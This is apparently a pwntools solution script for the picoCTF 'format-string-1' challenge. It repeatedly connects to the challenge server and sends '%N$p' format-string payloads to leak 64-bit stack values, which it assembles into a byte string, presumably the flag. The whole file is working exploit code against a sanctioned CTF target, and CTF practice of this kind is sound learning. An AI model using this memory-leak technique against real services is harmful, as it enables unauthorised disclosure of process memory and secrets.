#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 54966
HOST = "mimas.picoctf.net"
exe = context.binary = ELF('./format-string-1', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

string = b''
for i in range(6, 23):
	p = remote(HOST, PORT)
	# p = exe.process()
	p.sendlineafter(b"you:\n", f"%{i}$p")
	p.recvuntil("Here's your order: ")
	try:
		data = p64(int(p.recvline()[:-1], 16))
		string += data
		p.close()
	except:
		p.close()

print(string)

p.interactive()